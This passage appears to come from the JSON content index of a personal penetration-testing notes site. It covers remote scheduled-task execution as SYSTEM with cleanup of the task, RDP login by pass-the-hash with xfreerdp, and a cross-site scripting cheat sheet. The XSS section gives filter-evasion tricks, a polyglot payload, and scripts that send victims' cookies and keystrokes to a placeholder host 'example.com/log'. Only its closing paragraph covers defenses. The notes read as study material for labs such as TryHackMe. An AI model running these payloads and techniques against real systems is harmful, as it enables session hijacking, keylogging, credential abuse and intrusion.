style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Action &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;TASK_OBJECT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                       -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;User &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;NT AUTHORITY\\SYSTEM&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                       -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;TaskName &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;ATTACKER_TASK&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Invoke $ATTACKER_TASK.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Start-ScheduledTask&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;CimSession &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;SESSION_OBJECT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                    -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;TaskName &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;ATTACKER_TASK&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Clean up after yourself.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Unregister-ScheduledTask&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;CimSession &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;SESSION_OBJECT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                         -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;TaskName &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;ATTACKER_TASK&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Working-with-services-in-PowerShell":{"slug":"spells/Working-with-services-in-PowerShell","filePath":"spells/Working with services in PowerShell.md","title":"Working with services in PowerShell","links":[],"tags":["Application/PowerShell","OS/Windows/Services"],"content":"\nGet-Service — list all services, or drill down on a particular service.\nStart-Service -Name $SERVICE / sc.exe start $SERVICE — start $SERVICE.\nStop-Service -Name $SERVICE / sc.exe stop $SERVICE — stop $SERVICE.\n","richContent":"&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;Get-Service&lt;/code&gt; — list all services, or drill down on a particular service.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;Start-Service -Name $SERVICE&lt;/code&gt; / &lt;code&gt;sc.exe start $SERVICE&lt;/code&gt; — start &lt;code&gt;$SERVICE&lt;/code&gt;.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;Stop-Service -Name $SERVICE&lt;/code&gt; / &lt;code&gt;sc.exe stop $SERVICE&lt;/code&gt; — stop &lt;code&gt;$SERVICE&lt;/code&gt;.&lt;/li&gt;\n&lt;/ul&gt;"},"spells/XFreeRDP":{"slug":"spells/XFreeRDP","filePath":"spells/XFreeRDP.md","title":"XFreeRDP","links":[],"tags":["Application/XFreeRDP","Cryptography/Hashes/NT","AttackCycle/LateralMovement"],"content":"xfreerdp +clipboard \\\n         /cert:ignore \\\n         /dynamic-resolution \\\n         /mount:$SHARE_NAME,$LOCAL_DIR \\\n         /v:$HOST \\\n         /u:$USER \\\n         /p:$PASSWORD\nUsers can also be specified with an associated domain, and an NTLM hash can be provided instead of a password.\nxfreerdp /v:$HOST \\\n         /u:$DOMAIN\\$USER \\\n         /pth:$NTLM_HASH","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;xfreerdp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; +clipboard&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;         /cert:ignore&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;         /dynamic-resolution&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;         /mount:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$SHARE_NAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$LOCAL_DIR&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;         /v:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$HOST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;         /u:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$USER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;         /p:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$PASSWORD&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Users can also be specified with an associated domain, and an NTLM hash can be provided instead of a password.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;xfreerdp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /v:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$HOST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;         /u:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$DOMAIN&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;USER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;         /pth:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$NTLM_HASH&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/XSS-attacks":{"slug":"spells/XSS-attacks","filePath":"spells/XSS attacks.md","title":"Cross-site scripting (XSS) attacks","links":["spells/Uniform-resource-locators"],"tags":["FileFormat/HTML","Language/JavaScript","AttackCycle/Exploitation/XSS","AttackCycle/AntiForensics","Standard/URI","AttackCycle/Exfiltration"],"content":"Types of XSS attacks:\n\nReflected (URL-based, no server-side storage)\nStored\nDOM-based (really client-side)\n\nDOM-based attacks are client side — with both reflected and stored XSS, the server is embedding the attack into the page that’s being rendered. For DOM-based attacks, it’s the client that inserts the malicious JavaScript into the page (even if the data was provided by the server). Ask yourself: “How did this get into the page? Did the server put it there (reflected/stored XSS), or did my client put it there (DOM-based XSS)?”\nThe canonical (but highly annoying) XSS PoC is:\n&lt;script&gt;alert(&#039;XSS&#039;);&lt;/script&gt;\nA much less annoying XSS test is to select and manipulate the innerHTML of page elements:\n&lt;script&gt;\n\txssTest\n\t\t= document.querySelector(&quot;h1&quot;);\n\txssTest.innerHTML = &quot;XSS was here!&quot;;\n&lt;/script&gt;\nTips for writing JavaScript\nJavaScript accepts back-ticks as a type of quotation mark, so we actually have three different marks to work with (single quote, double quote, and back-tick).\nSometimes you’ll need to break out of a tag that you’re being inserted into. Various options:\n\nUse &quot;&gt; if you’re being inserted into an HTML attribute.\nUse &lt;/pre&gt; or &lt;/textarea&gt; for preformatted blocks and text areas.\nUse &#039;; followed by ;// for direct JavaScript inserts. (Note that it’s only possible to insert &lt;script/&gt; tags if the JavaScript you’re abusing is being included from a file, as HTML parsers are greedy about the closing &lt;/script&gt; tag.)\n\nMost regular expressions and filters are only executed in a single pass. Thus, a regular expression that’s filtering out &lt;script&gt; and &lt;/script&gt; tags can be circumvented by using &lt;s&lt;script&gt;cript&gt; and &lt;/s&lt;/script&gt;cript&gt;. That said, this trick doesn’t work for regular expressions that are removing single characters (for example, &lt; and &gt;).\nYou can also use the onload attribute to pull in JavaScript, though note that this is only functional the first time the page is loaded. This will often require you to close out the preceding attribute (&quot;) and leave off the trialing &quot; of the onload attribute in order for everything to work properly.\nThere’s also “polygot” strings which work in a variety of contexts. These have some pretty wild escaping going on; for example, the following (lightly modified from TryHackMe’s example) produces an “XSS” alert:\njaVasCript:/*-/*`/*\\`/*&#039;/*&quot;/**/(/* */onerror=alert(&#039;XSS&#039;) )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;&lt;sVg/&lt;sVg/oNloAd=alert(&#039;XSS&#039;)//&gt;&gt;\nFilter evasion\nBypass simple word filtering\nIn general, you can break up strings to get around this.\nalert(&quot;H&quot; + &quot;ello&quot;)\nThe eval() function can be used to turn strings into function names if a function is filtered.\neval(&quot;a&quot; + &quot;lert&quot;)(&quot;Hello&quot;)\nIt’s also possible (and safer, though if we’re breaking into things we probably care a lot less about safety) to use window[].\nwindow[&quot;a&quot; + &quot;lert&quot;](&quot;Hello&quot;)\nFor really heavy filtering, use something nutso like JSFuck.\n(Note that things like the JavaScript Obfuscator Tool won’t always remove functions and strings, as they tend to be geared more towards thwarting script analysis than bypassing filters.)\nSometimes filters are applied in a case-sensitive fashion. While JavaScript is case-sensitive, URL schemes, HTML tag names, and HTML tag attributes are case-insensitive (so, javascript: is treated the same as javaSCRIPT:, onclick is treated the same as ONCLICK, etc.).\nUsing iframes and images\nTypically XSS attacks work by injecting &lt;script/&gt; tags, but it’s also possible to inject JavaScript using the &lt;iframe/&gt; and &lt;img/&gt; tags by setting the src attribute to the javacript: pseudo-protocol. For example:\n&lt;!-- iframe injection --&gt;\n&lt;iframe src=&quot;javascript:alert(&#039;XSS&#039;);&quot;/&gt;\n \n&lt;!-- img injection --&gt;\n&lt;img src=&quot;javascript:alert(&#039;XSS&#039;);&quot;/&gt;\nNote, however, that JavaScript loaded in an &lt;iframe/&gt; won’t have access to the parent page’s DOM.\nFallbacks requiring user interaction\njavascript: URIs can also be included in anchor(&lt;a/&gt;) href attributes, as well as onmouseover and onclick attributes (which can be attached to almost any HTML tag). Getting these attacks to fire requires a user to interact with the modified tag, however.\nCommon objectives\nAccessing browser cookies\n&lt;script&gt;\n\tfetch(\n\t\t&#039;example.com/log&#039;\n\t\t\t+ &#039;?cookie=&#039;\n\t\t\t+ btoa(document.cookie)\n\t);\n&lt;/script&gt;\nKeylogging\n&lt;script&gt;\n\tdocument.onkeypress = function(e) {\n\t\tfetch(\n\t\t\t&#039;example.com/log&#039;\n\t\t\t\t+ &#039;?cookie=&#039;\n\t\t\t\t+ btoa(document.cookie)\n\t\t\t\t+ &#039;&amp;keypress=&#039;\n\t\t\t\t+ btoa(e.key)\n\t\t);\n\t}\n&lt;/script&gt;\nAdding the user’s cookies here allows us to tell whose keystrokes are whose!\nPort scanning\nAn example JavaScript port scanner (possibly broken).\nWebsite defacement\nYou can access elements of the DOM using document.getElementById(&quot;element-id&quot;) or document.querySelector(&quot;#element-id&quot;). The querySelector() method is a bit more flexible (you can use CSS-style selectors here) and should probably be preferred.\nTo get/set the content of an element, use the innerHTML method (to insert HTML directly into the DOM), or alternately innerText or textContent to set element text only.\nNote that &lt;script/&gt; tags inserted by setting an element’s innerHTML are not executed, however!\nDefenses\nThe key to defending against XSS is really to get your encoding right. User-generated code that’s passed off to JavaScript needs to be JavaScript-escaped first. User-generated code that’s written into the DOM needs to be HTML-escaped first. Know what the context is of your data, and escape/unescape appropriately when writing data from one context to another!","richContent":"&lt;p&gt;Types of XSS attacks:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Reflected (URL-based, no server-side storage)&lt;/li&gt;\n&lt;li&gt;Stored&lt;/li&gt;\n&lt;li&gt;DOM-based (really client-side)&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;DOM-based attacks are &lt;em&gt;client&lt;/em&gt; side — with both reflected and stored XSS, the server is embedding the attack into the page that’s being rendered. For DOM-based attacks, it’s the &lt;em&gt;client&lt;/em&gt; that inserts the malicious JavaScript into the page (even if the data was provided by the server). Ask yourself: “How did this get into the page? Did the server put it there (reflected/stored XSS), or did my client put it there (DOM-based XSS)?”&lt;/p&gt;\n&lt;p&gt;The canonical (but highly annoying) XSS PoC is:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;html&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;html&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;script&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;alert&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;XSS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&amp;#x3C;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;script&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;A much less annoying XSS test is to &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/Document/querySelector&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;select&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; and manipulate the innerHTML of page elements:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;html&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;html&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;script&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;\txssTest&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t\t=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; document&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;querySelector&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;h1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;\txssTest&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;innerHTML&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;XSS was here!&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&amp;#x3C;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;script&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;tips-for-writing-javascript&quot;&gt;Tips for writing JavaScript&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#tips-for-writing-javascript&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;JavaScript accepts back-ticks as a type of quotation mark, so we actually have three different marks to work with (single quote, double quote, and back-tick).&lt;/p&gt;\n&lt;p&gt;Sometimes you’ll need to break out of a tag that you’re being inserted into. Various options:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Use &lt;code&gt;&quot;&gt;&lt;/code&gt; if you’re being inserted into an HTML attribute.&lt;/li&gt;\n&lt;li&gt;Use &lt;code&gt;&amp;#x3C;/pre&gt;&lt;/code&gt; or &lt;code&gt;&amp;#x3C;/textarea&gt;&lt;/code&gt; for preformatted blocks and text areas.&lt;/li&gt;\n&lt;li&gt;Use &lt;code&gt;&#039;;&lt;/code&gt; followed by &lt;code&gt;;//&lt;/code&gt; for direct JavaScript inserts. (Note that it’s only possible to insert &lt;code&gt;&amp;#x3C;script/&gt;&lt;/code&gt; tags if the JavaScript you’re abusing is being included from a file, as HTML parsers are greedy about the closing &lt;code&gt;&amp;#x3C;/script&gt;&lt;/code&gt; tag.)&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Most regular expressions and filters are only executed in a single pass. Thus, a regular expression that’s filtering out &lt;code&gt;&amp;#x3C;script&gt;&lt;/code&gt; and &lt;code&gt;&amp;#x3C;/script&gt;&lt;/code&gt; tags can be circumvented by using &lt;code&gt;&amp;#x3C;s&amp;#x3C;script&gt;cript&gt;&lt;/code&gt; and &lt;code&gt;&amp;#x3C;/s&amp;#x3C;/script&gt;cript&gt;&lt;/code&gt;. That said, this trick doesn’t work for regular expressions that are removing single characters (for example, &lt;code&gt;&amp;#x3C;&lt;/code&gt; and &lt;code&gt;&gt;&lt;/code&gt;).&lt;/p&gt;\n&lt;p&gt;You can also use the &lt;code&gt;onload&lt;/code&gt; attribute to pull in JavaScript, though note that this is only functional the first time the page is loaded. This will often require you to close out the preceding attribute (&lt;code&gt;&quot;&lt;/code&gt;) and &lt;em&gt;leave off&lt;/em&gt; the trialing &lt;code&gt;&quot;&lt;/code&gt; of the &lt;code&gt;onload&lt;/code&gt; attribute in order for everything to work properly.&lt;/p&gt;\n&lt;p&gt;There’s also “polygot” strings which work in a variety of contexts. These have some pretty wild escaping going on; for example, the following (lightly modified from TryHackMe’s example) produces an “XSS” alert:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;html&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;html&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;jaVasCript:/*-/*`/*\\`/*&#039;/*&quot;/**/(/* */onerror=alert(&#039;XSS&#039;) )//%0D%0A%0d%0a//&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&amp;#x3C;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B31D28;--shiki-dark:#FDAEB7&quot;&gt;stYle/&amp;#x3C;/titLe/&amp;#x3C;/teXtarEa/&amp;#x3C;/scRipt/--!&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B31D28;--shiki-dark:#FDAEB7&quot;&gt;sVg/&amp;#x3C;sVg/oNloAd=alert(&#039;XSS&#039;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic&quot;&gt;//&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;span 